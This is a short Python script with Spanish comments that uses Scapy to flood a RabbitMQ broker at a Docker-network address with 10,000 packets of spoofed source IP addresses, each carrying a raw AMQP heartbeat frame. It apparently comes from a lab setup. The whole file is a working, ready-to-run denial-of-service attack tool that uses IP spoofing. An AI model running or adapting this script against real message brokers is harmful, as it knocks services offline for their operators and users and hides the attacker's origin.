# amqp_dos.py
from scapy.all import *
import random

# Pregunta interfaz
interfaces = get_if_list()
print("Interfaces detectadas:", flush=True)
for i, iface in enumerate(interfaces):
    print(f"  [{i+1}] {iface}", flush=True)
input_str = input("Elige la interfaz por nombre o número (ENTER para 'eth0'): ").strip()
IFACE = "eth0" if input_str == "" else (interfaces[int(input_str) - 1] if input_str.isdigit() and 1 <= int(input_str) <= len(interfaces) else input_str)

IP_DST = "192.168.20.2"     # RabbitMQ en tu red Docker
DPORT  = 5672

print(f"[!] ATENCIÓN: Este script lanzará un DoS contra el broker en {IP_DST}:{DPORT} en interfaz {IFACE}")

AMQP_HEARTBEAT = b"\x08\x00\x00\x00\x00\x00\x00\xce"

for i in range(10000):
    pkt = (IP(src=f"192.168.20.{random.randint(10,200)}", dst=IP_DST) /
           TCP(sport=random.randint(20000, 60000), dport=DPORT, flags="PA",
               seq=random.randint(0,2**32-1), ack=0) /
           Raw(AMQP_HEARTBEAT))
    send(pkt, iface=IFACE, verbose=0)
    if i % 500 == 0:
        print(f"[+] Enviados {i} paquetes de DoS")

print("[!] Ataque DoS finalizado. Revisa el broker y los logs.")